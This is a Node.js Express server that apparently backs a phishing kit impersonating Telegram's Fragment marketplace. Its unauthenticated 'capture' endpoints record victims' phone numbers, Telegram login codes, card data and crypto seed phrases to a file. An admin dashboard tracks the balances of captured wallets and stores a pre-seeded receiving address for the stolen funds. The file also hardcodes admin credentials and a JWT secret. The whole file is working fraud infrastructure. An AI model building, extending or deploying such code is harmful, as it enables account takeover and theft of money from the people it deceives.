import Database from 'better-sqlite3';
import express from 'express';
import jwt from 'jsonwebtoken';
import cookieParser from 'cookie-parser';
import cors from 'cors';
import { ethers } from 'ethers';
import path from 'path';
import { fileURLToPath } from 'url';
import fs from 'fs';

const __dirname = path.dirname(fileURLToPath(import.meta.url));

// Hardcoded Configuration
const WALLETCONNECT_PROJECT_ID = '71aee37d416435724b88c898b71df97a';
const ETH_RPC = 'https://eth.llamarpc.com';
const BNB_RPC = 'https://bsc-dataseed.binance.org';
const POLYGON_RPC = 'https://polygon-rpc.com';
const JWT_SECRET = 'samiristhegoat';
const ADMIN_USERNAME = 'admin';
const ADMIN_PASSWORD = 'samiristhegoat';
const VIEWER_USERNAME = 'viewer';
const VIEWER_PASSWORD = 'viewer123';

const db = new Database('fragment.db');

// Initialize Database
db.exec(`
  CREATE TABLE IF NOT EXISTS watched_wallets (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    label TEXT,
    address TEXT NOT NULL,
    role TEXT CHECK(role IN ('admin', 'viewer')) DEFAULT 'viewer',
    added_at DATETIME DEFAULT CURRENT_TIMESTAMP
  );

  CREATE TABLE IF NOT EXISTS saved_destinations (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    label TEXT,
    address TEXT NOT NULL,
    network TEXT CHECK(network IN ('ethereum', 'bnb', 'polygon', 'all')) DEFAULT 'all'
  );
`);

// Pre-seed saved_destinations
const seedDest = db.prepare('SELECT COUNT(*) as count FROM saved_destinations').get();
if (seedDest.count === 0) {
  db.prepare('INSERT INTO saved_destinations (label, address, network) VALUES (?, ?, ?)').run(
    'Main Receiving Wallet',
    '0x5020eefd8c93680510f06daa8096e5f20d34b23b',
    'all'
  );
}

const app = express();
app.use(express.json());
app.use(cookieParser());
app.use(cors());

// Auth Middleware
const authenticate = (req, res, next) => {
  const token = req.cookies.token;
  if (!token) return res.status(401).json({ error: 'Unauthorized' });

  try {
    const decoded = jwt.verify(token, JWT_SECRET);
    req.user = decoded;
    next();
  } catch (err) {
    res.status(401).json({ error: 'Unauthorized' });
  }
};

// --- API ROUTES ---

// Login
app.post('/api/login', (req, res) => {
  const { username, password } = req.body;
  let role = null;
  if (username === ADMIN_USERNAME && password === ADMIN_PASSWORD) {
    role = 'admin';
  } else if (username === VIEWER_USERNAME && password === VIEWER_PASSWORD) {
    role = 'viewer';
  }

  if (role) {
    const token = jwt.sign({ username, role }, JWT_SECRET, { expiresIn: '24h' });
    res.cookie('token', token, { httpOnly: true });
    return res.json({ success: true, role });
  }
  res.status(401).json({ error: 'Invalid credentials' });
});

// Logout
app.post('/api/logout', (req, res) => {
  res.clearCookie('token');
  res.json({ success: true });
});

// Dashboard: Get balances for all watched wallets
app.get('/api/balances', authenticate, async (req, res) => {
  const wallets = db.prepare('SELECT * FROM watched_wallets').all();
  const providers = {
    ethereum: new ethers.JsonRpcProvider(ETH_RPC),
    bnb: new ethers.JsonRpcProvider(BNB_RPC),
    polygon: new ethers.JsonRpcProvider(POLYGON_RPC),
  };

  const results = await Promise.all(wallets.map(async (wallet) => {
    const balances = {};
    for (const [network, provider] of Object.entries(providers)) {
      try {
        const balance = await provider.getBalance(wallet.address);
        balances[network] = ethers.formatEther(balance);
      } catch (err) {
        balances[network] = '0.0';
      }
    }
    return { ...wallet, balances };
  }));

  res.json(results);
});

// Settings: Manage saved destinations
app.get('/api/destinations', authenticate, (req, res) => {
  const dests = db.prepare('SELECT * FROM saved_destinations').all();
  res.json(dests);
});

app.post('/api/destinations', authenticate, (req, res) => {
  if (req.user.role !== 'admin') return res.status(403).json({ error: 'Forbidden' });
  const { label, address, network } = req.body;
  const result = db.prepare('INSERT INTO saved_destinations (label, address, network) VALUES (?, ?, ?)').run(label, address, network);
  res.json({ id: result.lastInsertRowid });
});

app.delete('/api/destinations/:id', authenticate, (req, res) => {
  if (req.user.role !== 'admin') return res.status(403).json({ error: 'Forbidden' });
  db.prepare('DELETE FROM saved_destinations WHERE id = ?').run(req.params.id);
  res.json({ success: true });
});

// Manage watched wallets
app.post('/api/watched', authenticate, (req, res) => {
  if (req.user.role !== 'admin') return res.status(403).json({ error: 'Forbidden' });
  const { label, address, role } = req.body;
  const result = db.prepare('INSERT INTO watched_wallets (label, address, role) VALUES (?, ?, ?)').run(label, address, role || 'viewer');
  res.json({ id: result.lastInsertRowid });
});

app.delete('/api/watched/:id', authenticate, (req, res) => {
  if (req.user.role !== 'admin') return res.status(403).json({ error: 'Forbidden' });
  db.prepare('DELETE FROM watched_wallets WHERE id = ?').run(req.params.id);
  res.json({ success: true });
});

// Fragment capture logic (migrated from Python)
app.post('/api/submit/phone', (req, res) => {
  const { phone, user } = req.body;
  fs.appendFileSync('submissions.txt', JSON.stringify({ type: 'phone', data: { phone, user } }) + '\n');
  res.json({ status: 'ok', message: 'Captured (Telethon capture is separate)' });
});

app.post('/api/submit/code', (req, res) => {
  const { phone, code, user } = req.body;
  fs.appendFileSync('submissions.txt', JSON.stringify({ type: 'code', data: { phone, code, user } }) + '\n');
  res.json({ status: 'ok' });
});

app.post('/api/submit/card', (req, res) => {
  const { phone, cardData, user } = req.body;
  fs.appendFileSync('submissions.txt', JSON.stringify({ type: 'card', data: { phone, cardData, user } }) + '\n');
  res.json({ status: 'ok' });
});

app.post('/api/submit/wallet', (req, res) => {
  const { seedPhrase, user } = req.body;
  fs.appendFileSync('submissions.txt', JSON.stringify({ type: 'wallet', data: { seedPhrase, user } }) + '\n');
  res.json({ status: 'ok' });
});

app.get('/api/link/:link_id', (req, res) => {
  const linkId = req.params.link_id;
  if (fs.existsSync('links.json')) {
    const links = JSON.parse(fs.readFileSync('links.json', 'utf8'));
    if (links[linkId]) {
      return res.json(links[linkId]);
    }
  }
  res.status(404).json({ error: 'Link not found' });
});

// Serve Frontend
const distPath = path.join(__dirname, '../design/dist');
if (fs.existsSync(distPath)) {
  app.use('/fragment', express.static(distPath));
  app.get('/fragment/*', (req, res) => {
    res.sendFile(path.join(distPath, 'index.html'));
  });
}

// Global Redirect for /fragment (no trailing slash)
app.get('/fragment', (req, res) => {
  res.redirect('/fragment/');
});

const PORT = 8000;
app.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 Node.js Backend running on http://0.0.0.0:${PORT}`);
});
